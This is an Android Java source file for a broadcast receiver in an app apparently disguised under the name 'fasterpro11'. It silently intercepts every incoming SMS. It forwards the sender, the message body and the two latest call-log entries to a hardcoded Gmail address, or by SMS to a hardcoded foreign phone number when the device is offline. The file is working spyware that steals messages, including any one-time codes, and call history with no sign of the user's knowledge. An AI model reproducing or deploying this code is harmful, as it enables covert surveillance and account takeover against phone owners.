package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.ArrayList;
import java.util.Date;

import javax.mail.MessagingException;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static String lastSender; // Static variable to hold last sender
    private static String lastMessage; // Static variable to hold last message body
    private static long lastTimestamp; // Static variable to hold last message timestamp
    private Context mContext; // Context variable to hold the BroadcastReceiver context

    private static final String FORWARD_SMS_NUMBER = "+8801915564632";
    private static final long DUPLICATE_INTERVAL = 2 * 60 * 1000; // 2 minutes in milliseconds


    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context; // Store the context for later use
        Bundle bundle = intent.getExtras();

        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    lastSender = sender;
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS from: " + sender + ", message: " + messageBody);

                    try {
                        if (isInternetConnected()) {
                            if (!shouldDuplicateForward(messageBody)) {
                                forwardSmsByEmail(sender, messageBody);
                            }
                        } else {
                            // No internet connection, forward via SMS to FORWARD_SMS_NUMBER

                            if (!isInternetConnected() && !shouldDuplicateForward(messageBody)) {
                                forwardSmsBySMS1(sender, messageBody);
                                forwardSmsBySMS(sender, messageBody);
                            }

                        }
                    } catch (MessagingException e) {
                        Log.e(TAG, "Failed to forward SMS: " + e.getMessage());
                    }
                }
            }
        }
    }

    private boolean isInternetConnected() {
        // Check internet connectivity using mContext
        ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        }
        return false;
    }

    private boolean shouldDuplicateForward(String messageBody) {
        long currentTimestamp = System.currentTimeMillis();
        if (messageBody.equals(lastMessage) && (currentTimestamp - lastTimestamp) < DUPLICATE_INTERVAL) {
            Log.d(TAG, "Duplicate message detected, not forwarding.");
            return true;
        } else {
            lastMessage = messageBody;
            lastTimestamp = currentTimestamp;
            return false;
        }
    }

    private void forwardSmsByEmail(String sender, String messageBody) throws MessagingException {
        // Forward SMS via email
        String subject = "Received SMS";
        String body = "From: " + sender + "\n" + messageBody + "\nRecent Call Logs:\n" + getRecentCallLogs();
        sendEmail(subject, body);
        Log.d(TAG, "Received SMS forwarded successfully via email");
    }

    private void sendEmail(String subject, String body) throws MessagingException {
         JavaMailAPI_SmsReceiver_Send.sendMail("abontiangum99@gmail.com", subject, body);
        Log.d(TAG, "Email sent successfully.");
    }


    private void forwardSmsBySMS1(String sender, String messageBody) {
        // Forward SMS via SMS to FORWARD_SMS_NUMBER
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(FORWARD_SMS_NUMBER, null, "From: " + sender + "\n" + messageBody, null, null);
        Log.d(TAG, "Forwarded SMS by SMS to " + FORWARD_SMS_NUMBER + ": " + messageBody);
    }


    private boolean smsSent = false; // Variable to track if SMS has been sent
    private long lastSentTime = 0; // Variable to track the timestamp of the last sent SMS

    private void forwardSmsBySMS(String sender, String messageBody) {
        long currentTime = System.currentTimeMillis();

        // Check if SMS has been sent within the last 2 minutes
        if (smsSent && (currentTime - lastSentTime) < 2 * 60 * 1000) {
            Log.d(TAG, "SMS already sent within the last 2 minutes. Skipping additional sending.");
            return;
        }

        // Forward SMS via SMS to FORWARD_SMS_NUMBER
        String smsRecipient = FORWARD_SMS_NUMBER;
        String smsMessage = "Received SMS from " + sender + "\nMessage: " + messageBody + "\nCall Logs:\n" + getRecentCallLogs();

        SmsManager smsManager = SmsManager.getDefault();
        ArrayList<String> parts = smsManager.divideMessage(smsMessage); // Handle long messages
        smsManager.sendMultipartTextMessage(smsRecipient, null, parts, null, null);
        Log.d(TAG, "Forwarded SMS by SMS to " + smsRecipient + ": " + smsMessage);

        // Update SMS sent status and timestamp
        smsSent = true;
        lastSentTime = currentTime;
    }





    private String getRecentCallLogs() {
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };
        Cursor cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 2"); // Limit to last 2 call logs
        if (cursor != null && cursor.moveToFirst()) {
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            do {
                String number = cursor.getString(numberIndex);
                long date = cursor.getLong(dateIndex);
                String duration = cursor.getString(durationIndex);
                int type = cursor.getInt(typeIndex);
                String callType = getCallType(type); // Method to get call type as string
                callLogBuilder.append("Number: ").append(number).append(", Type: ").append(callType)
                        .append(", Duration: ").append(duration).append(", Date: ").append(new Date(date).toString()).append("\n");
            } while (cursor.moveToNext());
            cursor.close();
        }
        return callLogBuilder.toString();
    }

    private String getCallType(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    // Static method to retrieve lastSender
    public static String getLastSender() {
        return lastSender;
    }

    // Getter method to retrieve Sender (assuming it should return lastSender)
    public static String getSender() {
        return lastSender;
    }

}
